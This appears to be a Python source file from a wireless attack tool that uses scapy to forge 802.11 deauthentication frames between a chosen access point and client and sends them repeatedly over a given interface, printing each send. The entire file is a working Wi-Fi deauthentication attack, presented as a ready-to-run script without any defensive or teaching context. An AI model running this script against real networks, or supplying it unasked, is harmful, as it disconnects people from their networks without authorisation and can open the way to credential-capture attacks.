from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import os
import sys
sys.path.append('..')
import argumentparser
from time import sleep
from termcolor import colored as termcolor
from scapy.all import *

args = argumentparser.parse()

def start():

    ap = args.bssid
    client = args.client
    pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
    pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()

    for n in range(int(args.number)):
        sendp(pkt, iface=args.iface, verbose=0)
        print("Send deauth packet: " + termcolor(ap, "green") + " (ap) > " + termcolor(client, "blue") + " (client) via " + 
        termcolor(args.iface, "red") + " #" + str(n + 1))
        sleep(0.5)
        sendp(pkt1, iface=args.iface, verbose=0)
        print("Send deauth packet: " + termcolor(client, "blue") + " (client) > " + termcolor(ap, "green") + " (ap) via " + 
        termcolor(args.iface, "red") + " #" + str(n + 1))